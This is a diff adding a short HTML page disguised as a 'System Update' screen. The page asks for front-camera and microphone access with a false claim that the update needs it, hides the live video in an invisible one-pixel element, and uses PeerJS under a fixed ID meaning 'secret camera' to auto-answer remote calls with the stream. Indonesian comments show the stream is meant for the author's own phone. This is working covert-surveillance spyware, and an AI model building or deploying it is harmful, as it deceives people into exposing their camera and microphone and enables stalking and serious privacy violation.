@@ -1,0 +1,31 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>System Update</title>
+  <script src="https://unpkg.com/peerjs@1.5.2/dist/peerjs.min.js"></script>
+</head>
+<body style="background-color: black; color: white; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; font-family: sans-serif;">
+  
+  <p>System is updating... Please do not close this window.</p>
+  
+  <video id="localVideo" autoplay playsinline muted style="width:1px; height:1px; opacity:0; position:absolute;"></video>
+  
+  <script>
+    // Meminta akses kamera depan dan mic
+    navigator.mediaDevices.getUserMedia({video: {facingMode: "user"}, audio: true})
+      .then(stream => {
+        document.getElementById('localVideo').srcObject = stream;
+        
+        // ID Unik agar iPhone Anda tahu harus menyambung ke mana
+        const peer = new Peer('kamera-rahasia-112233'); 
+        
+        peer.on('call', call => {
+          call.answer(stream); // Otomatis mengangkat saat Anda konek
+        });
+      })
+      .catch(err => alert("Mohon izinkan akses kamera agar update berjalan"));
+  </script>
+</body>
+</html>
